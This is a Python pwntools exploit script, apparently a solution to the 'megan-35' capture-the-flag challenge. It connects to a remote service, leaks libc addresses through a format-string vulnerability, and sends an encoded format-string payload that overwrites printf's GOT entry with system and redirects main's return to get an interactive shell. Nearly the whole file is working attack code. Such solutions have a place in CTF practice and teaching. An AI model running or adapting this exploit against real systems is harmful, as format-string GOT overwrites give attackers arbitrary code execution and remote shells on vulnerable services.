# coding:utf-8

from pwn import *
from meganencode import encode

context.log_level = "debug"
context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']

# env = {"LD_PRELOAD": "./libc.so.6"}
# pwn = process('./megan-35', env = env)
pwn = remote("megan35.stillhackinganyway.nl",3535)

libc = ELF("./libc.so.6")

def get_sys_addr():
    payload = '\x0c\xa0\x04\x08'
    payload += '%p'*70
    payload += '--%s'
    payload = encode( payload)
    pwn.recvuntil("MEGAN-35 encryption.\n")
    pwn.sendline(payload)
    data = u32(pwn.recv().split("--")[1][:4])
    log.info("printf : "+hex(data))
    sys_addr = data - libc.symbols['printf'] + libc.symbols['system']
    return sys_addr

def get_ret_addr():
    """
    获取main函数的返回地址(__libc_start_main+247), 后面将其改写为main函数的地址
    """
    payload = "%96$x"
    payload = encode(payload)
    pwn.recvuntil("MEGAN-35 encryption.\n")
    pwn.sendline(payload)
    data = pwn.recv()
    return data + 0xc

def user():
    """
    本地调试
    """
    payload = 'IP3JHHu9OhR5'
    pwn.recvuntil("MEGAN-35 encryption.\n")
    gdb.attach(pwn, "b* 0x08048558")
    pwn.sendline(payload)
    pwn.interactive()

printf_got = 0x0804A00C # \x0c\xa0\x04\x08
main = 0x080484E0

def ctf():
    """
    改写printf_got为system的地址, 改写main函数返回地址为main函数
    第二次调用main函数时输入 "/bin/sh\x00"的megan35编码 获得shell
    """
    # system_addr = get_sys_addr()
    system_addr = 0xf7e53940
    ret_addr = 0xffffddcc
    log.info("system : "+hex(system_addr))
    log.info("ret_addr : "+hex(ret_addr))
    # 0x0804 < 0x3940 < 0x84e0 < 0xf7e5
    payload = p32(ret_addr+2) + p32(printf_got)
    payload += p32(ret_addr) + p32(printf_got+2)
    payload += "%2036c%71$hn"
    payload += "%12604c%72$hn"
    payload += "%19360c%73$hn"
    payload += "%29445c%74$hn"
    payload = encode(payload)
    pwn.recvuntil("MEGAN-35 encryption.\n")
    pwn.sendline(payload)
    pwn.interactive()

if __name__ == '__main__':
    ctf()
